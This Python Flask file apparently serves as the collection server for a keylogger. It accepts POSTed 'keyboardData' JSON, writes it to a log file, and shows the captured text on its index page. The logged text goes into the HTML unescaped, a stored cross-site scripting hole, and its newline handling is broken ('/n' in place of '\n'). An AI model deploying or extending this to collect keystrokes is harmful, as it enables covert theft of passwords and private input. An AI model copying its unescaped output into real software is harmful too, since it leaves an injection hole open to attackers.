import os
from flask import Flask, request

def create_app():
    app = Flask(__name__)

    @app.route('/')
    def index():
        try:
            with open('./log.txt', 'r') as f:
                kl_file = f.read()
                return f"<h1>Logged data</h1><p>{kl_file.replace('/n', '<br>')}</p>"
        except:
            return "<h1>Nothing logged yet.</h1>"

    @app.route('/', methods=['POST'])
    def log_data():
        print("Request received!")
        with open('log.txt', 'w') as f:
            f.write(request.json['keyboardData'])
        return "Successfully set the data"

    return app

if __name__ == '__main__':
    app = create_app()
    port = int(os.environ.get('PORT', 8080))
    app.run(debug=False, host='0.0.0.0', port=port)
